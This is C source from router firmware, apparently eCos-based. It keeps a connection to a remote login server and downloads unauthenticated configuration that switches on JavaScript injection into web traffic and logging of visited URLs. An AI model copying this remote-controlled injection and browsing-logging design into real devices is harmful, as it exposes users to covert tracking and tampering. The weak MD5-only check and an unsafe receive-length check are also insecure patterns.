int file_to_buf(unsigned char **file_buf_save, char *file_path, int file_len)
{
	unsigned char *file_buf = NULL;
	int file_fd = -1, read_count = 0;

	file_buf = (unsigned char *)malloc(file_len);
	if(NULL == file_buf )
	{
		printf("%s : No memory.\n", __FUNCTION__);
		goto fail_exit;
	}
	memset(file_buf, 0x0, file_len);

	file_fd = open(file_path, O_RDONLY);
	if(file_fd < 0)
	{
		diag_printf("[%s][%d] open file_path failed\n", __FUNCTION__, __LINE__);
		goto fail_exit;
	}
	
	read_count = read(file_fd, file_buf, file_len);
	if(read_count != file_len)
	{
		diag_printf("[%s][%d] read_count = %d, file_len = %d\n", __FUNCTION__, __LINE__, read_count, file_len);
		goto fail_exit;
	}

	close(file_fd);
	unlink(file_path);
	*file_buf_save = file_buf;
	return 0;

fail_exit:
	if(NULL != file_buf)
		free(file_buf);
	if(file_fd != -1)
		close(file_fd);
	unlink(file_path);
	return -1;
}

int keep_get_conf(struct lm_conf_ack *conf_ack, unsigned char **conf_content_save)
{
	char host[64] = {0};
	char server_path[64] = {0};
	char conf_server_ip[IP_LEN_16] = {0} ;
	unsigned char *file_buf = NULL, *conf_content = NULL;
	int conf_file_len = -1;
	
	if(NULL == conf_ack)
	{
		diag_printf("[%s][%d] invalid para\n", __FUNCTION__, __LINE__);
		return -1;
	}

	if(0 != get_url_path(conf_ack->url, host, server_path))
	{
		diag_printf("[%s]host = %s, server_path = %s\n", __FUNCTION__, host, server_path);
		return -1;
	}

	if(0 != get_ip(host, conf_server_ip))
	{
		diag_printf("[%s]get conf server ip failed\n", __FUNCTION__);
		return -1;
	}
	conf_server_ip[IP_LEN_16-1] = '\0';

	if((conf_file_len = download_conf(host, server_path, conf_server_ip, CONF_AES_TMP)) < 0)
	{
		diag_printf("[%s]download_conf failed\n", __FUNCTION__);
		return -1;
	}

	if(file_to_buf(&file_buf, CONF_AES_TMP, conf_file_len) !=0)
	{
		diag_printf("[%s]file_to_buf failed\n", __FUNCTION__);
		return -1;
	}

	if(md5_check((unsigned char *)(conf_ack->md5), file_buf, conf_file_len) != 0)
	{
		diag_printf("[%s]md5_check failed\n", __FUNCTION__);
		free(file_buf);
		return -1;
	}
#if 0
	if(0 != conf_aes_decrypt())
	{
		diag_printf("[%s]conf_aes_decrypt failed\n", __FUNCTION__);
		return -1;
	}
#else
	conf_content = (unsigned char *)malloc(conf_file_len+1);
	if(NULL == conf_content )
	{
		printf("%s : No memory.\n", __FUNCTION__);
		free(file_buf);
		return -1;
	}
	memset(conf_content, 0x0, conf_file_len+1);
	memcpy(conf_content, file_buf, conf_file_len);
	conf_content[conf_file_len] = '\0';
	*conf_content_save = conf_content;
	free(file_buf);
#endif

	return 0;
}

int keep_conf_ack(char *conf_ack_buf)
{
	struct lm_conf_ack conf_ack;
	unsigned char *conf_content = NULL;
	int ret;

	memset(&conf_ack, 0x0, sizeof(conf_ack));

	ret = parse_conf_ack(&conf_ack, conf_ack_buf);

	if(-1 == ret)
	{
		diag_printf("[%s][%d] parse_conf_ack failed\n", __FUNCTION__, __LINE__);
		return -1;
	}

	if(conf_ack.result != 0)
	{
		diag_printf("[%s][%d] conf_ack result not ok\n", __FUNCTION__, __LINE__);
		free(conf_ack.url);
		free(conf_ack.md5);
		return -1;
	}

	ret = keep_get_conf(&conf_ack, &conf_content);
	if(ret != 0)
	{
		diag_printf("[%s][%d] keep_get_conf failed\n", __FUNCTION__, __LINE__);
		free(conf_ack.url);
		free(conf_ack.md5);
		return -1;
	}

	free(conf_ack.url);
	free(conf_ack.md5);

	switch(conf_ack.flag)
	{
		case KEEP_CONF_DATA_RULE:
			nis_fastcheck_mode(0);
			start_data_rule(conf_content);
			break;
		case KEEP_CONF_JS_RULE:
			js_inject_stop();
			init_js_inject_para(conf_content);
			js_inject_start();
			break;
		case KEEP_CONF_LOG_URL:
			url_record_stop();
			url_log_start(conf_content);
			break;
		default:
			break;
	}

	return 0;
}

int lm_do_keep(int s)
{
	fd_set rfds;
	struct timeval tv;
	struct lm_login_keep_hdr *hdr = NULL;
	int retval;
	char recvbuf[ARRAY_LEN_256] = {0};

	FD_ZERO(&rfds);
	FD_SET(s, &rfds);
	tv.tv_sec = 0;
	tv.tv_usec = 200 *1000; //0.2 second

	retval = select(s + 1, &rfds, NULL, NULL, &tv);

	if (retval <= 0 || !FD_ISSET(s, &rfds))
		return -1;

	memset(recvbuf,0,sizeof(recvbuf));
	retval = recv(s, recvbuf, ARRAY_LEN_256, 0);

	hdr = (struct lm_login_keep_hdr *)recvbuf;

	if(retval < hdr->length)
	{
		diag_printf("[%s][%d] retval <hdr->length\n", __FUNCTION__, __LINE__);
		return -1;
	}

	diag_printf("[%s][%d] ntohs(hdr->cmd) = %d\n", __FUNCTION__, __LINE__, ntohs(hdr->cmd));
	switch(ntohs(hdr->cmd))
	{
		case LM_CMD_KEEP_FIRM_VER:
			keep_firm_version(recvbuf);
			break;
		case LM_CMD_KEEP_CONF_ACK:
			keep_conf_ack(recvbuf);
			break;
		default:
			break;
	}

	return 0;
}

#if 0
void set_tcp_keepalive(int s)
{
	int keepAlive = 1; // 开启keepalive属性
	int keepIdle = 60; // 如该连接在60秒内没有任何数据往来,则进行探测 
	int keepInterval = 5; // 探测时发包的时间间隔为5 秒
	int keepCount = 3; // 探测尝试的次数.如果第1次探测包就收到响应了,则后2次的不再发.

	setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (void *)&keepAlive, sizeof(keepAlive));
	setsockopt(s, SOL_TCP, TCP_KEEPIDLE, (void*)&keepIdle, sizeof(keepIdle));
	setsockopt(s, SOL_TCP, TCP_KEEPINTVL, (void *)&keepInterval, sizeof(keepInterval));
	setsockopt(s, SOL_TCP, TCP_KEEPCNT, (void *)&keepCount, sizeof(keepCount));

	return;
}
#endif

int lm_keep(uint32 ip, uint16 port)
{
	int s = -1, ret;
	int data_rule_fail = -1, js_rule_fail = -1, log_url_fail = -1;
	struct sockaddr_in server_addr;

	keep_sequence = 1;

	s = create_tcp_socket();
	if(-1 == s)
	{
		perror("socket error\n");
		return -1;
	}

	//set_tcp_keepalive(s);

	bzero(&server_addr, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = ip;
	ret = connect(s, (struct sockaddr*)&server_addr, sizeof(struct sockaddr));
	if(ret < 0)
	{
		perror("Could not connect.\n");
		close(s);
		return -1;
	}

keep_req_again:
	ret = send_keep_req(s);
	if(ret != 0)
	{
		diag_printf("[%s][%d] send_keep_req failed\n", __FUNCTION__, __LINE__);
		//keep_sequence = 1;
		goto keep_req_again;
	}

keep_ack_agian:
	ret = recv_keep_ack(s);
	if(ret != 0)
	{
		diag_printf("[%s][%d] recv_keep_ack failed\n", __FUNCTION__, __LINE__);
		goto keep_ack_agian;
	}

conf_req_again:
	if(data_rule_fail == -1)
	{
		ret = send_conf_req(s, KEEP_CONF_DATA_RULE);
		if(ret != 0)
		{
			diag_printf("[%s][%d] send_conf_req failed\n", __FUNCTION__, __LINE__);
			data_rule_fail = -1;
			goto conf_req_again;
		}
		else
		{
			data_rule_fail = 0;
			ret = lm_do_keep(s);
			if(ret != 0)
			{
				diag_printf("[%s][%d] send_conf_req failed\n", __FUNCTION__, __LINE__);
				data_rule_fail = -1;
				goto conf_req_again;
			}
		}
	}

	if(js_rule_fail == -1)
	{
		ret = send_conf_req(s, KEEP_CONF_JS_RULE);
		if(ret != 0)
		{
			diag_printf("[%s][%d] send_conf_req failed\n", __FUNCTION__, __LINE__);
			js_rule_fail = -1;
			goto conf_req_again;
		}
		else
		{
			js_rule_fail = 0;
			ret = lm_do_keep(s);
			if(ret != 0)
			{
				diag_printf("[%s][%d] send_conf_req failed\n", __FUNCTION__, __LINE__);
				js_rule_fail = -1;
				goto conf_req_again;
			}
		}
	}

	if(log_url_fail == -1)
	{
		ret = send_conf_req(s, KEEP_CONF_LOG_URL);
		if(ret != 0)
		{
			diag_printf("[%s][%d] send_conf_req failed\n", __FUNCTION__, __LINE__);
			log_url_fail = -1;
			goto conf_req_again;
		}
		else
		{
			log_url_fail = 0;
			ret = lm_do_keep(s);
			if(ret != 0)
			{
				diag_printf("[%s][%d] send_conf_req failed\n", __FUNCTION__, __LINE__);
				log_url_fail = -1;
				goto conf_req_again;
			}
		}
	}

	for(;;)
	{
		lm_do_keep(s);
	}

	return 0;
}

void lm_login_keep_main()
{
	char login_serv_ip[IP_LEN_16] = {0};
	struct lm_login_redirect *login_redirect = NULL;
	uint32 red_ip;
	uint16 red_port;
	
	get_login_serv_ip(login_serv_ip);
	
login_again:
	login_redirect = lm_login(login_serv_ip, LM_LOGIN_PORT);
	if(NULL == login_redirect)
	{
		diag_printf("[%s][%d] get login_redirect failed\n", __FUNCTION__, __LINE__);
		cyg_thread_delay(INTERVAL_TIME_600*100);
		goto login_again;
	}

	keep_cks = ntohl(login_redirect->checksum);
	keep_cks ^= LM_XOR_CKS;
	red_ip = login_redirect->ip;
	red_port = ntohs(login_redirect->port);
	free(login_redirect);
	
	lm_keep(red_ip, red_port);
	
	diag_printf("%s exit!!!\n", __FUNCTION__);
	return;
}

static cyg_handle_t lm_login_keep_handle;
static cyg_thread lm_login_keep_thread;
static char lm_login_keep_stack[1024*16];

void login_keep_start()
{
    int pid;
    
    pid = oslib_getpidbyname("lm_login_keep");
    if (pid != 0)//线程已存在，直接返回
        return;
    cyg_thread_create(
        5,
        (cyg_thread_entry_t *)lm_login_keep_main,
        0,
        "lm_login_keep",
        (void *)&lm_login_keep_stack[0],
        sizeof(lm_login_keep_stack),
        &lm_login_keep_handle,
        &lm_login_keep_thread);
    
    cyg_thread_resume(lm_login_keep_handle);
}

void login_keep_stop()
{
    int pid;
    
    pid = oslib_getpidbyname("lm_login_keep");
    
    if (pid != 0)
    {
        cyg_thread_kill(lm_login_keep_handle);
        cyg_thread_delete(lm_login_keep_handle);
    }

    return;
}


